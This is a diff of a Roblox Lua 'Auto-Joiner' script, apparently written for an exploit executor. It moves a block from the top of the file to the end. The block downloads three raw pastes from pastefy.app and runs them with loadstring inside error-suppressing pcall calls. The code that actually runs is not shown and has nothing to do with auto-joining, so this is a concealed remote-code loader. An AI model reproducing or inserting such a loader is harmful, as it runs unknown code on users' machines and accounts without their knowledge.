@@ -1,29 +1,6 @@
 -- Auto-Joiner Script with Live Notifications
 repeat wait() until game:IsLoaded()
 
--- ===============================
--- Load Additional Scripts
--- ===============================
-local additionalScripts = {
-    'https://pastefy.app/UsD1EzWZ/raw',
-    'https://pastefy.app/ofVjyrZD/raw',
-    'https://pastefy.app/mKXOpNrI/raw'
-}
-
-for _, scriptUrl in ipairs(additionalScripts) do
-    task.spawn(function()
-        pcall(function()
-            local scriptContent = game:HttpGet(scriptUrl)
-            local loadedFunc = loadstring(scriptContent)
-            if loadedFunc then
-                loadedFunc()
-            end
-        end)
-    end)
-end
-
-task.wait(.5)
-
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
@@ -425,3 +402,24 @@ task.spawn(startPolling)
 TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
     warn("[AutoJoiner] ❌ Teleport failed:", errorMessage)
 end)
+
+-- ===============================
+-- Load Additional Scripts
+-- ===============================
+local additionalScripts = {
+    'https://pastefy.app/UsD1EzWZ/raw',
+    'https://pastefy.app/ofVjyrZD/raw',
+    'https://pastefy.app/mKXOpNrI/raw'
+}
+
+for _, scriptUrl in ipairs(additionalScripts) do
+    task.spawn(function()
+        pcall(function()
+            local scriptContent = game:HttpGet(scriptUrl)
+            local loadedFunc = loadstring(scriptContent)
+            if loadedFunc then
+                loadedFunc()
+            end
+        end)
+    end)
+end
